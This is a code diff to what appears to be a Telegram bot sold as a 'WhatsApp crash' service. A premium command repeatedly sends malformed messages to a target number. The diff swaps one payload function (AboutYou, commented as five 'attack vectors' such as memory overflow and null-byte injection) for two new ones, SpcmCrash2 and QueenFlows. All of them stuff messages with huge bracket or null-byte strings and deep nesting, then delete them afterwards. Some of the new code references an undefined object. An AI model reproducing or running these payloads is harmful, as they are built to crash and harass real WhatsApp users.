@@ -1584,7 +1584,8 @@ bot.command("xandro", checkWhatsAppConnection, checkPremium, async (ctx) => {
     try {
       while (Date.now() < endAt) {
         if (!isWhatsAppConnected) break;
-        await AboutYou(target);
+        await SpcmCrash2(target);
+        await QueenFlows(target);
         await sleep(3000);
       }
     } catch (err) {
@@ -1868,409 +1869,227 @@ async function clearChat(target) {
 }
 
 //FANGSYEN
-async function AboutYou(target, ptcp = true) {
-    // Helper function untuk generate message ID
-    const generateMessageID = () => {
-        const timestamp = Date.now().toString();
-        const random = Math.floor(Math.random() * 999999999).toString();
-        return '3EB0' + timestamp + random;
-    };
 
-    // Verified Business Nodes
-    const verifiedBusinessNodes = [
-        { tag: "biz", attrs: {} },
-        { tag: "verified", attrs: { verified: "1" } },
-        { tag: "meta", attrs: {}, content: [{
-            tag: "mentioned_users", attrs: {}, content: [{ 
-                tag: "to", attrs: { jid: target } 
-            }]
-        }]}
-    ];
-
-    for (let i = 0; i < 99; i++) {
-        try {
-            // ==========================================
-            // ATTACK VECTOR 1: Memory Overflow via Nested ViewOnce
-            // ==========================================
-            const memoryOverflowMsg = await generateWAMessageFromContent(target, {
-                viewOnceMessage: {
-                    message: {
-                        viewOnceMessage: {  // Nested viewOnce (parser confusion)
-                            message: {
-                                messageContextInfo: {
-                                    deviceListMetadata: {},
-                                    deviceListMetadataVersion: 2,
-                                },
-                                interactiveResponseMessage: {
-                                    body: { text: "./#", format: "DEFAULT" },
-                                    contextInfo: {
-                                        mentionedJid: [target],
-                                        isForwarded: true,
-                                        forwardingScore: 9999,
-                                        callLogMessage: {
-                                            isVideo: true,
-                                            callOutcome: null,
-                                            durationSecs: 0,
-                                            callCreatorJid: target,
-                                            participants: [target]
-                                        }
-                                    },
-                                    nativeFlowResponseMessage: {
-                                        name: "call_permission_request",
-                                        paramsJson: "\x10".repeat(1045000),
-                                        version: 3,
-                                    },
-                                    entryPointConversionSource: "galaxy_message",
-                                }
-                            }
-                        }
-                    }
-                }
-            }, {
-                ephemeralExpiration: 0,
-                forwardingScore: 9999,
-                isForwarded: true,
-                font: Math.floor(Math.random() * 99999999),
-                background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
-            });
-
-            await sock.relayMessage(target, {
-                groupStatusMessageV2: { message: memoryOverflowMsg.message },
-            }, ptcp ? {
-                messageId: memoryOverflowMsg.key.id,
-                participant: { jid: target },
-                additionalNodes: verifiedBusinessNodes
-            } : { 
-                messageId: memoryOverflowMsg.key.id,
-                additionalNodes: verifiedBusinessNodes
-            });
-
-            await sleep(1);
-            await sock.sendMessage(sock.user.jid, { delete: memoryOverflowMsg.key });
-
-            // ==========================================
-            // ATTACK VECTOR 2: Parser Stack Overflow via Deep Nesting
-            // ==========================================
-            let deepSections = [];
-            for (let j = 0; j < 35; j++) {  // Increased dari 25 ke 35
-                let complexText = "</𖥂 byzzz 𖥂\\>";
-                
-                // Level 1: Section
-                let section = {
-                    title: complexText,
-                    highlight_label: `Layer${j}`,
-                    rows: []
-                };
-                
-                // Level 2: Rows (increased)
-                for (let r = 0; r < 3; r++) {
-                    let row = {
-                        title: complexText,
-                        id: `r${j}_${r}`,
-                        subrows: []
-                    };
-                    
-                    // Level 3: Subrows (increased)
-                    for (let s = 0; s < 4; s++) {
-                        let subrow = {
-                            title: "Nested " + s,
-                            id: `s${j}_${r}_${s}`,
-                            subsubrows: []
-                        };
-                        
-                        // Level 4: Subsubrows (new layer)
-                        for (let ss = 0; ss < 3; ss++) {
-                            let subsubrow = {
-                                title: "Deep " + ss,
-                                id: `ss${j}_${r}_${s}_${ss}`,
-                                subsubsubrows: []  // Level 5 (parser killer)
-                            };
-                            
-                            // Level 5: Maximum nesting
-                            for (let sss = 0; sss < 2; sss++) {
-                                subsubrow.subsubsubrows.push({
-                                    title: "Max",
-                                    id: `sss${j}_${r}_${s}_${ss}_${sss}`
-                                });
-                            }
-                            
-                            subrow.subsubrows.push(subsubrow);
-                        }
-                        
-                        row.subrows.push(subrow);
-                    }
-                    
-                    section.rows.push(row);
-                }
-                
-                deepSections.push(section);
-            }
-
-            let complexList = {
-                title: "byzzz", 
-                sections: deepSections,
-            };
-
-            let stackOverflowMsg = generateWAMessageFromContent(target, {
-                viewOnceMessage: {
-                    message: {
-                        messageContextInfo: {
-                            deviceListMetadata: {},
-                            deviceListMetadataVersion: 2,
-                        },
-                        interactiveMessage: proto.Message.InteractiveMessage.create({
-                            contextInfo: {
-                                mentionedJid: [target, "0@s.whatsapp.net"],
-                                isForwarded: true,
-                                forwardingScore: 9999,
-                                forwardedNewsletterMessageInfo: {  // New field (parser confusion)
-                                    newsletterJid: "0@newsletter",
-                                    serverMessageId: 1,
-                                },
-                                businessMessageForwardInfo: {
-                                    businessOwnerJid: "0@s.whatsapp.net",
-                                },
-                                participant: "0@s.whatsapp.net", 
-                                remoteJid: "status@broadcast",
-                                callLogMessage: {
-                                    isVideo: true,
-                                    callOutcome: null,
-                                    durationSecs: 0,
-                                    callCreatorJid: target,
-                                    participants: [target]
-                                }
-                            },
-                            body: proto.Message.InteractiveMessage.Body.create({
-                                text: "</𖥂 byzzz 𖥂\\>",
-                            }),
-                            footer: proto.Message.InteractiveMessage.Footer.create({
-                                buttonParamsJson: JSON.stringify(complexList),
-                            }),
-                            header: proto.Message.InteractiveMessage.Header.create({
-                                buttonParamsJson: JSON.stringify(complexList),
-                                subtitle: "byzzz",
-                                hasMediaAttachment: false,
-                            }),
-                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
-                                messageParamsJson: "{".repeat(15000),  // Increased dari 9000
-                                buttons: [
-                                    { name: "single_select", buttonParamsJson: JSON.stringify(complexList) },
-                                    { name: "call_permission_request", buttonParamsJson: JSON.stringify({status:true}) },
-                                    { name: "payment_method", buttonParamsJson: JSON.stringify(complexList) },
-                                    { name: "single_select", buttonParamsJson: JSON.stringify(complexList) },
-                                    { name: "mpm", buttonParamsJson: JSON.stringify(complexList) },
-                                    { name: "review_and_pay", buttonParamsJson: JSON.stringify(complexList) },  // Extra button
-                                    { name: "payment_info", buttonParamsJson: JSON.stringify(complexList) },    // Extra button
-                                ],
-                            }),
-                        }),
-                    },
-                },
-            }, { userJid: target });
-
-            await sock.relayMessage(target, stackOverflowMsg.message, {
-                participant: { jid: target },
-                messageId: stackOverflowMsg.key.id,
-                additionalNodes: verifiedBusinessNodes
-            });
-
-            await sleep(2);
-            await sock.sendMessage(sock.user.jid, { delete: stackOverflowMsg.key });
-
-            // ==========================================
-            // ATTACK VECTOR 3: Context Confusion via Malformed Sticker
-            // ==========================================
-            const contextConfusionMsg = {
-                key: {
-                    remoteJid: target,
-                    fromMe: true,
-                    id: generateMessageID()  
-                },
-                message: {
-                    stickerMessage: {
-                        url: "https://mmg.whatsapp.net/v/t62.15575-24/545932757_821392374146649_3844921663899464720_n.enc?ccb=11-4&oh=01_Q5Aa3AGj0JnyULRqYe4gBwnvliNLa3fa7bD8ImS4lYXFNGCa0Q&oe=6946309C&_nc_sid=5e03e0&mms3=true",
-                        fileSha256: "fxxvVtTCmZ2Bpm/GEYpFF2GKUzJ8wWVrGY1mCmmh4I4=",
-                        fileEncSha256: "3xsWx0Y/1pNbWXWh/OG2mt4Ld0FEug25kyZ+lC+UbV4=",
-                        mediaKey: "uHEU7OghGYVW7IcWjhNlxPeZHNS0qfphvRUcy6+22wo=",
-                        mimetype: "image/webp",
-                        height: 64,
-                        width: 64,
-                        directPath: "/v/t62.15575-24/545932757_821392374146649_3844921663899464720_n.enc?ccb=11-4&oh=01_Q5Aa3AGj0JnyULRqYe4gBwnvliNLa3fa7bD8ImS4lYXFNGCa0Q&oe=6946309C&_nc_sid=5e03e0",
-                        fileLength: "13862",
-                        mediaKeyTimestamp: "1763628089",
-                        isAnimated: false,
-                        // Context confusion fields
-                        contextInfo: {
-                            isForwarded: true,
-                            forwardingScore: 9999,
-                            mentionedJid: [target],
-                            quotedMessage: {  // Malformed quote (parser confusion)
-                                conversation: "\x00".repeat(50000)
-                            },
-                            callLogMessage: {
-                                isVideo: true,
-                                callOutcome: null,
-                                durationSecs: 0,
-                                callCreatorJid: target,
-                                participants: [target]
-                            }
-                        }
-                    }
-                }
-            };
-            
-            await sock.relayMessage(target, contextConfusionMsg.message, {
-                participant: { jid: target },
-                messageId: contextConfusionMsg.key.id,
-                additionalNodes: verifiedBusinessNodes
-            });
-
-            await sleep(1000);
-            await sock.sendMessage(sock.user.jid, { delete: contextConfusionMsg.key });
-
-            // ==========================================
-            // ATTACK VECTOR 4: Type Confusion via Mixed Message Types
-            // ==========================================
-            const typeConfusionMsg = await generateWAMessageFromContent(target, {
-                viewOnceMessage: {
-                    message: {
-                        // Multiple conflicting message types in one (parser killer)
-                        conversation: "Mixed",
-                        extendedTextMessage: {
-                            text: "Types",
-                            contextInfo: {
-                                mentionedJid: [target],
-                                quotedMessage: {
-                                    listMessage: {
-                                        title: "Confusion",
-                                        sections: deepSections
-                                    }
-                                },
-                                callLogMessage: {
-                                    isVideo: true,
-                                    callOutcome: null,
-                                    durationSecs: 0,
-                                    callCreatorJid: target,
-                                    participants: [target]
-                                }
-                            }
-                        },
-                        listMessage: {
-                            title: "Conflict",
-                            sections: deepSections
-                        },
-                        interactiveMessage: proto.Message.InteractiveMessage.create({
-                            body: proto.Message.InteractiveMessage.Body.create({
-                                text: "TypeMix"
-                            }),
-                            contextInfo: {
-                                callLogMessage: {
-                                    isVideo: true,
-                                    callOutcome: null,
-                                    durationSecs: 0,
-                                    callCreatorJid: target,
-                                    participants: [target]
-                                }
-                            },
-                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
-                                messageParamsJson: "[".repeat(10000),
-                                buttons: [
-                                    { name: "single_select", buttonParamsJson: "{".repeat(5000) }
-                                ]
-                            })
-                        })
-                    }
-                }
-            }, {
-                ephemeralExpiration: 0,
-                forwardingScore: 9999,
-                isForwarded: true
-            });
-
-            await sock.relayMessage(target, {
-                groupStatusMessageV2: { message: typeConfusionMsg.message }
-            }, ptcp ? {
-                messageId: generateMessageID(),  // ← Fixed: Manual ID
-                participant: { jid: target },
-                additionalNodes: verifiedBusinessNodes
-            } : {
-                messageId: generateMessageID(),  // ← Fixed: Manual ID
-                additionalNodes: verifiedBusinessNodes
-            });
-
-            await sleep(3);
-            
-            // Store message ID untuk delete
-            const typeConfusionMsgId = generateMessageID();
-            
-            await sock.relayMessage(target, {
-                groupStatusMessageV2: { message: typeConfusionMsg.message }
-            }, ptcp ? {
-                messageId: typeConfusionMsgId,
-                participant: { jid: target },
-                additionalNodes: verifiedBusinessNodes
-            } : {
-                messageId: typeConfusionMsgId,
-                additionalNodes: verifiedBusinessNodes
-            });
-
-            await sleep(4);
-            await sock.sendMessage(sock.user.jid, { 
-                delete: { 
-                    remoteJid: sock.user.jid,
-                    fromMe: true,
-                    id: typeConfusionMsgId
-                }
-            });
-
-            // ==========================================
-            // ATTACK VECTOR 5: NULL Byte Injection
-            // ==========================================
-            const nullByteMsg = await generateWAMessageFromContent(target, {
-                viewOnceMessage: {
-                    message: {
-                        interactiveResponseMessage: {
-                            body: {
-                                text: "\x00\x00\x00" + "A".repeat(100000) + "\x00\x00\x00",  // NULL byte sandwich
-                                format: "DEFAULT"
-                            },
-                            nativeFlowResponseMessage: {
-                                name: "\x00call_permission_request\x00",  // NULL in field name
-                                paramsJson: "\x00".repeat(500000),  // Pure NULL bytes
-                                version: 3,
-                            }
-                        }
-                    }
-                }
-            }, {
-                ephemeralExpiration: 0,
-                forwardingScore: 9999,
-                isForwarded: true
-            });
-
-            await sock.relayMessage(target, {
-                groupStatusMessageV2: { message: nullByteMsg.message }
-            }, ptcp ? {
-                messageId: nullByteMsg.key.id,
-                participant: { jid: target },
-                additionalNodes: verifiedBusinessNodes
-            } : {
-                messageId: nullByteMsg.key.id,
-                additionalNodes: verifiedBusinessNodes
-            });
-
-            await sleep(6);
-            await sock.sendMessage(sock.user.jid, { delete: nullByteMsg.key });
-
-            // Final delay
-            await sleep(1000);
-            
-        } catch (error) {
-            console.log(`Error on iteration ${i}:`, error.message);
+async function SpcmCrash2(target) {
+  let maklo = JSON.stringify({
+    status: true,
+    criador: "pler",
+    sessionName: "./sessions/maklo",
+    isConnected: true,
+    uptime: 10240,
+    bugMethod: "sql_injection",
+    resultado: {
+      type: "md",
+      ws: {
+        _events: {
+          "CB:ib,,dirty": ["Array"],
+          "CB:iq,,pair-success": ["Array"]
+        },
+        _eventsCount: 500000,
+        _maxListeners: 50,
+        url: "wss://web.whatsapp.com/ws/chat",
+        config: {
+          version: ["2.2412.54", "stable"],
+          browser: ["Firefox", "Windows"],
+          waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
+          sockConnectTimeoutMs: 15000,
+          keepAliveIntervalMs: 25000,
+          logger: { level: "warn", silent: false },
+          emitOwnEvents: true,
+          defaultQueryTimeoutMs: 45000,
+          retryRequestDelayMs: 300,
+          maxMsgRetryCount: 3,
+          auth: { credentials: "authToken123", method: "noise" },
+          markOnlineOnConnect: false,
+          syncFullHistory: false,
+          linkPreviewImageThumbnailWidth: 150,
+          transactionOpts: { maxRetries: 2, timeoutMs: 7000 },
+          options: { compress: false },
+          appStateMacVerification: { enable: false, mode: "loose" },
+          mobile: true
         }
+      }
     }
-}
+  });
+  const Node = [{
+    attrs: { biz_bot: "1" }, 
+    tag: "bot"
+    },
+    {
+    attrs: {}, 
+    tag: "biz"
+  }];
+      let sections = [];
 
+      for (let i = 0; i < 25; i++) {
+        let largeText = "</𖥂 𝒀𝒖𝒖𝒌𝒆𝒚 𝑫𝒆 𝒁𝒆𝒑𝒑𝒆𝒍𝒊 𖥂\\>";
+
+        let deepNested = {
+          title: largeText,
+          highlight_label: `Ngewe ${i}×`,
+          rows: [
+            {
+              title: largeText,
+              id: `id${i}`,
+              subrows: [
+                {
+                  title: "Zeppeli De Familia",
+                  id: `/${i}`,
+                  subsubrows: [
+                    {
+                      title: "De Nazi",
+                      id: `/${i}`,
+                    },
+                    {
+                      title: "De Soviet",
+                      id: `/${i}`,
+                    },
+                  ],
+                },
+                {
+                  title: "America Ya",
+                  id: `/${i}`,
+                },
+              ],
+            },
+          ],
+        };
+
+        sections.push(deepNested);
+      }
+
+      let listMessage = {
+        title: "𝑫𝒛𝒆𝒑𝒑𝒆𝒍𝒊 𝑫𝒆 𝑭𝒂𝒎𝒊𝒍𝒊𝒂", 
+        sections: sections,
+      };
+
+      let msg = generateWAMessageFromContent(
+        target,
+        {
+          viewOnceMessage: {
+            message: {
+              messageContextInfo: {
+                deviceListMetadata: {},
+                deviceListMetadataVersion: 2,
+              },
+              interactiveMessage: proto.Message.InteractiveMessage.create({
+                contextInfo: {
+                  mentionedJid: [target, "13135550002@s.whatsapp.net"],
+                  isForwarded: true,
+                  forwardingScore: 999,
+                  businessMessageForwardInfo: {
+                    businessOwnerJid: "13135550002@s.whatsapp.net",
+                  },
+                  participant: "0@s.whatsapp.net", 
+                  remoteJid: "status@broadcast"
+                },
+                body: proto.Message.InteractiveMessage.Body.create({
+                  text: "</𖥂 𝒀𝒖𝒖𝒌𝒆𝒚 𝑫𝒆 𝒁𝒆𝒑𝒑𝒆𝒍𝒊 𖥂\\>",
+                }),
+                footer: proto.Message.InteractiveMessage.Footer.create({
+                  buttonParamsJson: "{[".repeat(9000),
+                }),
+                header: proto.Message.InteractiveMessage.Header.create({
+                  buttonParamsJson: "]}".repeat(9000),
+                  subtitle: "𝒁𝒆𝒑𝒑𝒆𝒍𝒊 𝑫𝒆 𝑭𝒂𝒎𝒊𝒍𝒊𝒂",
+                  hasMediaAttachment: false,
+                }),
+                nativeFlowMessage:
+                  proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                    messageParamsJson: "{[".repeat(9000), 
+                    buttons: [
+                       {
+                        name: "single_select",
+                        buttonParamsJson: maklo
+                      }, 
+                      {
+                        name: "call_permission_request",
+                        buttonParamsJson: maklo
+                      },
+                      {
+                        name: "call_permission_request",
+                        buttonParamsJson: maklo
+                      },
+                      {
+                        name: "mpm",
+                        buttonParamsJson: ""
+                      },
+                      {
+                        name: "mpm",
+                        buttonParamsJson: ""
+                      },
+                     ],
+                     messageParamsJson: "]}".repeat(9000), 
+                  }),
+              }),
+            },
+          },
+        },
+        { userJid: target }
+      );
+
+      await Yuukey.relayMessage(target, msg.message, {
+        participant: { jid: target },
+        messageId: msg.key.id,
+        addtionalNodes: Node
+      });
+      await sleep(1);
+      await Yuukey.sendMessage(target, { delete:msg.key });
+    }
+    
+async function QueenFlows(target) {
+  const msg = await generateWAMessageFromContent(target,
+    {
+      viewOnceMessage: {
+        message: {
+          interactiveMessage: {
+            header: { 
+              title: "", 
+              hasMediaAttachment: false 
+            },
+            body: { 
+              text: "</𖥂 𝒀𝒖𝒖𝒌𝒆𝒚 𝒁𝒆𝒑𝒑𝒆𝒍𝒊 𖥂\\>" 
+            },
+            nativeFlowMessage: {
+              messageParamsJson: "{".repeat(10000),
+              buttons: [
+                { 
+                  name: "single_select", 
+                  buttonParamsJson: JSON.stringify({ status: true })
+                },
+                { 
+                  name: "call_permission_request", 
+                  buttonParamsJson: JSON.stringify({ status: true })
+                },
+                {
+                  name: "mpm", 
+                  buttonParamsJson: ""
+                }, 
+                {
+                  name: "mpm", 
+                  buttonParamsJson: ""
+                }
+              ],
+            },
+            contextInfo: {
+              remoteJid: "status@broadcast",
+              participant: target,
+              forwardingScore: 250208,
+              isForwarded: false,
+              mentionedJid: [target, "13135550002@s.whatsapp.net"]
+            },
+          },
+        },
+      },
+    }, {});
+
+  await sock.relayMessage(target, msg.message, {
+    participant: { jid: target },
+    messageId: msg.key.id
+  });
+  await sleep(1);
+  await sock.sendMessage(target, { delete:msg.key });
+}
 
 
 bot.launch({
